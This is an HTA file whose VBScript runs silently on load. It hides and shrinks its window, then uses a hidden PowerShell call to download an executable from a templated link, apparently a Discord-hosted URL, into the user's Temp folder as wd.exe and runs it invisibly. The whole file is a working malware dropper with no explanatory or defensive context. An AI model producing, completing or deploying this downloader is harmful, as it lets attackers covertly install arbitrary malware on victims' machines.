<!DOCTYPE html>
<html>
<head>
<hta:application id="app" windowstate="minimize" showintaskbar="no" sysmenu="no" caption="no" />
<script language="VBScript">
Sub Window_OnLoad
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    Set objShell = CreateObject("WScript.Shell")
    
    url = "{{ DISCORD_LINK }}"
    dest = "C:\Users\Admin\AppData\Local\Temp\wd.exe"
    
    cmd = "powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & dest & "'"""
    objShell.Run cmd, 0, True
    
    objShell.Run dest, 0, False
    window.close
End Sub
</script>
</head>
<body></body>
</html>
